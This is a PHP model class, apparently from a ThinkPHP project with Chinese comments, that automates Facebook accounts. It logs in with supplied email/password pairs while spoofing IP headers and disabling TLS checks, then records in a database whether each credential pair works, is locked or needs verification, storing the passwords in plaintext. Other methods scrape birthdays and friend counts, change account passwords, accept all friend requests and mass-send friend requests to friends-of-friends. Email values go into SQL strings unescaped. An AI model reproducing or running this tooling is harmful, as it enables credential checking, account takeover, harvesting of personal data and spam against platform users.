<?php
namespace Home\Model;
use Think\Model;
Vendor('phpQuery',VENDOR_PATH.'phpQuery');
Vendor('simple_html_dom',VENDOR_PATH.'simple_html_dom');
Vendor('RollingCurl',VENDOR_PATH.'rolling-curl');
Vendor('RollingCurlGroup',VENDOR_PATH.'rolling-curl');


/**
* FaceBook
*
*/
class FaceBookModel extends Model
{
	public $base_url   = 'https://www.facebook.com/';
	public $email  = null;
	public $pass   = null;
	public $curl_opts = null;
	public $profile_href = null;
	public $cookie_file = null;
	public $user_id = null;
	public $token   = null;
	public $version = null;

	/**
	* 构造函数
	*
	*/
    public function __construct(){
    	$this->email = I('email');
    	$this->pass  = I('pass');
    	$this->new_pass = I('newpass');
        $this->cookie_file = CACHE_PATH.'/Cookie/'.$this->email;

		$this->curl_opts    = array(
			CURLOPT_COOKIEJAR      => $this->cookie_file,
			CURLOPT_USERAGENT	   => 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.80 Safari/537.36',
			CURLOPT_SSL_VERIFYPEER => false,
			CURLOPT_SSL_VERIFYHOST => 0,
			CURLOPT_REFERER		   => 'https://www.facebook.com/',
			CURLOPT_AUTOREFERER	   => true,
			CURLOPT_CONNECTTIMEOUT => 10,
			CURLOPT_RETURNTRANSFER => 1,
			CURLOPT_HEADER		   => 0,
			);
    	if (!empty(I('ip'))) {
    		$ip = I('ip');
    		$header = array('CLIENT-IP:'.$ip, 'X-FORWARDED-FOR:'.$ip );
    		$this->curl_opts[CURLOPT_HTTPHEADER] = $header;
    	}
    	parent::__construct();
    }
	/**
	* 模拟登录
	* @param string 
	* @param string 
	* @return array -1/1/2/3/4/5 登录失败/成功/旧密码/验证邮箱/锁号/未知错误
	*/
	public function login(){
		$rv['login_status'] = 1;
		$rv['login_msg']    = '正确账号';
		$pass	  = I('pass');
		if (empty($this->email) || empty($pass)) {
			return false;
		}

		$query = array(
			'email'=>$this->email,
			'pass'=>$pass,
			'persistent'=>1,
			);

		// 必须带上这个cookie，facebook用来检测是否时通过浏览器登录的
		$cookie = 'fb_gate=https%3A%2F%2Fwww.facebook.com%2F; _js_reg_fb_ref=https%3A%2F%2Fwww.facebook.com%2F';
		$login_opts = $this->curl_opts;
		$login_opts[CURLOPT_URL]	 	 = $this->base_url.'login.php?login_attempt=1&lwv=110';
		$login_opts[CURLOPT_POST]		 = true;
		$login_opts[CURLOPT_POSTFIELDS]	 = $query;
		$login_opts[CURLOPT_COOKIE]   	 = $cookie;
		$login_opts[CURLOPT_HEADER]		 = 1;

		$ch = curl_init();
		curl_setopt_array($ch,$login_opts);
		$content = curl_exec($ch);
		curl_close($ch);

		// file_put_contents(CACHE_PATH.'Login/'.$this->email.'.html', $content);

		$pos = strripos($content, 'HTTP/1.1');
		$content = substr($content, $pos);
		$res = substr($content, 9,3);
		switch ($res) {
			case '200':
				$data = array();
				$data['email'] = $this->email;
				$data['pass']     = $pass;
				$data['login_status']   = -1;
	  			$this->add($data,array(),true);
	  			$rv['login_status'] = -1;
	  			$rv['login_msg']    = '错误账号';
				break;
			case '302':
				$data = array();
				$data['email'] = $this->email;
				$data['pass']     = $pass;

				$num = preg_match_all("/set-cookie/i", $content);
				if ($num < 4) {
					$data['login_status']   = 2;
		  			$rv['login_status'] 	= 2;
		  			$rv['login_msg']    	= '锁号';
				}else{
					preg_match('/Location[\s\S]*facebook\.com\/([\s\S]*)\r\nX-Content-Type-Options/i', $content,$matches);
					if (isset($matches[1])&&!empty($matches[1])) {
						$data['login_status']   = 3;
			  			$rv['login_status'] 	= 3;
			  			$rv['login_msg']    	= '验证邮箱';
					}else{
						$data['login_status']   = 1;
					}
				}
	            //$query = "INSERT INTO __PREFIX__face_book (email,pass,login_status) VALUES ('". $data['email']."','".$data['pass']."',".$data['login_status']. ") ON DUPLICATE KEY UPDATE login_status=".$data['login_status'];
	  			$this->add($data,array(),true);
				break;
			
			default:
				$data = array();
				$data['email'] = $this->email;
				$data['pass']     = $pass;
				$data['login_status']   = 5;
	  			$this->add($data,array(),true);
	  			$rv['login_status'] = 5;
	  			$rv['login_msg']    = '未知错误';
				break;
		}

		$this->curl_opts[CURLOPT_COOKIEFILE] =  $this->cookie_file;
		return $rv;
	}
	

	/**
	* 抓取用户profile_href,user_id,token,vesion
	* @return string/bool
	*/
	public function catchUserInfo(){
		$capt_opts = $this->curl_opts;
		$capt_opts[CURLOPT_URL] =  $this->base_url;
		$ch = curl_init();
		curl_setopt_array($ch, $capt_opts);
		$content = curl_exec($ch);
		curl_close($ch);

		// profile_href
		\phpQuery::newDocument($content);
		$this->profile_href = pq("div [data-click='profile_icon'] a")->attr('href');
		// user_id
		preg_match('/{"USER_ID":"([\s\S]*)",/iU', $content,$matches);
		$this->user_id =  $matches[1];
		// token
		preg_match('/{"token":"([\s\S]*)"}/iU', $content,$matches);
		$this->token = $matches[1];
		// version
		preg_match('/{"version":"([\s\S]*);/iU', $content,$matches);
		$this->version = $matches[1];

		if(empty($this->profile_href)){
			return false;
		}else{
	        $data = array();
			$data['profile_href']  = $this->profile_href;
			$this->where("`email` = '".$this->email."'")->save($data);
			return $this->profile_href;
		}

	}
	
	/**
	* 抓取好友数量
	* @return int
	*/
	public function catchFriendsNum(){
		$capt_opts = $this->curl_opts;
		$capt_opts[CURLOPT_URL] =  $this->profile_href;
		$ch = curl_init();
		curl_setopt_array($ch, $capt_opts);
		$content = curl_exec($ch);
		curl_close($ch);
		$content = str_replace('<!--', '', $content);
		$content = str_replace('-->','',$content);
        // file_put_contents(CACHE_PATH.$this->email.'--friends.html',$content);
		\phpQuery::newDocumentHTML($content);
		$friends_num = pq("._gs6")->text();

		$data = array();
		$data['friends_num']  = $friends_num;
		$this->where("`email` = '".$this->email."'")->save($data);
		return $friends_num;
	}

	/**
	* 抓取用户生日
	* @return string
	*/
	public function catchBirthday(){
		$capt_opts = $this->curl_opts;
		$capt_opts[CURLOPT_URL] =  $this->profile_href.'/about';
		$ch = curl_init();
		curl_setopt_array($ch, $capt_opts);
		$content = curl_exec($ch);
		curl_close($ch);
		$content = str_replace('<!--', '', $content);
		$content = str_replace('-->',  '', $content);
        // file_put_contents(CACHE_PATH.$this->email.'--birthday.html',$content);
		// $content = file_get_contents(CACHE_PATH.'birthday.html');
		\phpQuery::newDocumentHTML($content);
		$birthday = pq("._4tnv._2pif:has('.img.sp_owM48kRhARK.sx_83c411') span>div:last")->text();

		$data = array();
		$data['birthday'] = $birthday;
		$this->where("`email` = '".$this->email."'")->save($data);
		return $birthday;
	}

	/**
	* 确认所有好友请求
	*
	*/
	public function acceptFriend(){
		$capt_opts = $this->curl_opts;
		$capt_opts[CURLOPT_URL] =  $this->base_url."/ajax/requests/loader/?__pc=EXP1%3ADEFAULT";
		$query = array(
			"log_impressions"=>true,
			"__user"=>$this->user_id,
			"__a"=>"1",
			// "__dyn"=>"7AmajEzUGBym5Q9UoGya4A5ER6yUmyUyGiyEyut9LFwxBxC9V8C3F6y8-bxu3efwFG2Dy9A7W88y8aJxafSiVWxeUlwzx2bwYDDBBwDK4VqCgS2PxO",
			// "__req"=>"h",
			"fb_dtsg"=>$this->token,
			// "ttstamp":26581701011128256497811410988,
			"__rev"=>$this->version
			);
		$capt_opts[CURLOPT_POST] = true;
		$capt_opts[CURLOPT_POSTFIELDS] = $query;
		$ch = curl_init();
		curl_setopt_array($ch, $capt_opts);
		$content = curl_exec($ch);
		curl_close($ch);
        file_put_contents(CACHE_PATH.'accept.html', $content);
        $content = str_replace('<!--', '', $content);
        $content = str_replace('-->',  '', $content);

        $pos = stripos($content, "fbRequestList hasPYMK");
        if (!$pos) {
        	return;
        }

		$capt_opts = $this->curl_opts;
		$url =  $this->base_url.'/ajax/reqs.php?__pc=EXP1%3ADEFAULT';
		$capt_opts[CURLOPT_POST] = true;
		preg_match_all("/class=\\\\\"objectListItem jewelItemNew\\\\\" id=\\\\\"([\s\S]*)_1_req/iU", $content,$matches);
		$confirm = $matches[1];

        
        foreach ($confirm as $value) {
        	$query = array(
			"fb_dtsg"=>$this->token,
			"confirm"=>$value,
			"type"=>"friend_connect",
			"request_id"=>$value,
			"list_item_id"=>$value."_1_req",
			"status_div_id"=>$value."_1_req_status",
			"inline"=>"1",
			"ref"=>"jewel",
			"ego_log"=>"",
			"actions[accept]"=>"1",
			"nctr[_mod]"=>"pagelet_bluebar",
			"__user"=>$this->user_id,
			"__a"=>"1",
			"__rev"=>$this->version,
			);
			$capt_opts[CURLOPT_POSTFIELDS] = $query;

			$request = new \RollingCurlRequest($url);
			$request->options = $capt_opts; 
			$requests[] = $request;
        }
        if (empty($requests)) {
        	return ;
        }

		$rc = new \RollingCurl();
		if (sizeof($requests) < 20) {
			$rc->window_size = sizeof($requests);
		}else{
			$rc->window_size = 20;
		}
		foreach ($requests as $value) {
			$rc->add($value);
		}
		$rc->execute();
	}

	/**
	* 修改密码
	* 
	*/
	public function modifyPass(){
		// 抓取必要信息
		$capt_opts = $this->curl_opts;
		$capt_opts[CURLOPT_URL] =  $this->base_url.'settings?tab=account&section=email&view';
		$capt_opts[CURLOPT_HEADER] = 1;

		$ch = curl_init();
		curl_setopt_array($ch, $capt_opts);
		$content = curl_exec($ch);
		curl_close($ch);
		file_put_contents(CACHE_PATH.'modifyPass.html', $content);
		$content = str_replace("<!--", "", $content);
		$content = str_replace("-->", "", $content);
		
		\phpQuery::newDocumentHTML($content);
		$fb_dtsg = pq("input[name=fb_dtsg]")->val();


		// 发送修改密码请求
		$query = array(
			'fb_dtsg'=>$fb_dtsg,
			'password_strength'=>'2',
			'password_old'=>$this->pass,
			'password_new'=>$this->new_pass,
			'password_confirm'=>$this->new_pass,
			'__user' => $this->user_id,
			);
		$capt_opts = array();
		$capt_opts = $this->curl_opts;
		$capt_opts[CURLOPT_POST] = true;
		$capt_opts[CURLOPT_POSTFIELDS] = $query;
		$capt_opts[CURLOPT_URL] =  $this->base_url.'ajax/settings/account/password.php?__pc=EXP1%3ADEFAULT';
		$capt_opts[CURLOPT_HEADER] = 1;

		$ch = curl_init();
		curl_setopt_array($ch, $capt_opts);
		$content = curl_exec($ch);
		curl_close($ch);
		file_put_contents(CACHE_PATH.'modifyPass.html', $content); 
	}

	/**
	* 添加好友
	*
	*/
	public function addFriends(){
		$friends_url = $this->catchFriendsHrefs();
		$this->catchAndSend($friends_url);
	}

	/**
	* 抓取我的好友页面的好友链接
	*
	*/
	private function catchFriendsHrefs(){
		// 抓取我的好友页面
		$capt_opts = $this->curl_opts;
		if (stripos($this->profile_href,'?')) {
			$capt_opts[CURLOPT_URL] = $this->profile_href.'&sk=friends';
		}else{
			$capt_opts[CURLOPT_URL] = $this->profile_href.'/friends';
		}
		$ch = curl_init();
		curl_setopt_array($ch, $capt_opts);
		$content = curl_exec($ch);
		curl_close($ch);
		file_put_contents(CACHE_PATH.'addFriends.html', $content);

		// 处理内容
		$content = preg_replace("/<code[\s\S]*><!--/iU", "", $content);
		$content = preg_replace("/--><\/code>/iU", "", $content);
		file_put_contents(CACHE_PATH.'addFriends.html', $content);
		// 分析html,获取好友的好友链接
		\phpQuery::newDocumentHTML($content);
		$friends_url = array();
		foreach (pq("a._39g5") as $value) {
			$href = pq($value)->attr("href");
			if(stripos($href,'www')){
	            $friends_url[] = $href;
			}
		}
		return $friends_url;
	}

	/**
	* 抓取好友的好友页面的好友信息,并发送添加好友请求
	* @param  array $friends_url 
	*/
	private function catchAndSend($friends_url){
		$requests = array();
		foreach ($friends_url as $url) {
			// 抓取好友的好友页面
			$capt_opts = $this->curl_opts;
			$request = new \RollingCurlRequest($url);
			$request->options = $capt_opts; 
			$requests[] = $request;
		}

        if (empty($requests)) {
        	return ;
        }

		$rc = new \RollingCurl(array($this,'sendRequestCallBack'));
        if(sizeof($requests)<20){
            $rc->window_size = sizeof($requests);
        }else{
            $rc->window_size = 20;
        }

		foreach ($requests as $value) {
			$rc->add($value);
		}
		$rc->execute();
	

	}

	public  function sendRequestCallBack($response, $info=''){
			// 处理内容
			$response = preg_replace("/<code[\s\S]*><!--/iU", "", $response);
			$response = preg_replace("/--><\/code>/iU", "", $response);

			// 分析html,获取添加好友需要的数据
			\phpQuery::newDocumentHTML($response);
			$pagelet_timeline_main_column = pq("#pagelet_timeline_main_column")->attr("data-gt");
	        $pagelet_timeline_main_column = json_decode($pagelet_timeline_main_column);
	        $profile_owner = $pagelet_timeline_main_column->profile_owner;

	        $requests = array();
			foreach (pq("div.fsl.fwb.fcb > a") as $value) {
				
				$data_hovercard = pq($value)->attr("data-hovercard");
				$data_gt = pq($value)->attr("data-gt");
				$data_gt = json_decode($data_gt);
				preg_match("/\?id=([0-9]*)&/iU", $data_hovercard,$matches);
				$to_friend = $matches[1];

				// 发送好友请求
				$query = array(
					"to_friend"=>$to_friend,
					"action"=>"add_friend",
					"how_found"=>"profile_friends",
					"ref_param"=>"pb_friends_tl",
					"link_data[gt][coeff2_registry_key]"=>$data_gt->coeff2_registry_key,
					"link_data[gt][coeff2_info]"=>$data_gt->coeff2_info,
					"link_data[gt][coeff2_action]"=>$data_gt->coeff2_action,
					"link_data[gt][coeff2_pv_signature]"=>$data_gt->coeff2_pv_signature,
					"link_data[gt][profile_owner]"=>$profile_owner,
					"link_data[gt][ref]"=>"timeline:timeline",
					"outgoing_id"=>'',
					"logging_location"=>'',			
					"no_flyout_on_click"=>"true",
					"ego_log_data"=>'',
					"http_referer"=>'',
					"floc"=>"friends_tab",
					"__user"=>$this->user_id,
					"__a"=>"1",
					"fb_dtsg"=>$this->token,
					"__rev"=>$this->version
					);
				$capt_opts = $this->curl_opts;
				$url = "https://www.facebook.com/ajax/add_friend/action.php?__pc=EXP1%3ADEFAULT";
				$capt_opts[CURLOPT_POST] = true;
				$capt_opts[CURLOPT_POSTFIELDS] = $query;
				$request = new \RollingCurlRequest($url);
				$request->options = $capt_opts; 
				$requests[] = $request;
			}

	        if (empty($requests)) {
	        	return ;
	        }

			$rc = new \RollingCurl();
			if (sizeof($requests)<20) {
				$rc->window_size = sizeof($requests);
			}else{
				$rc->window_size = 20;
			}
			
			foreach ($requests as $value) {
				$rc->add($value);
			}
			$rc->execute();

	}


	

}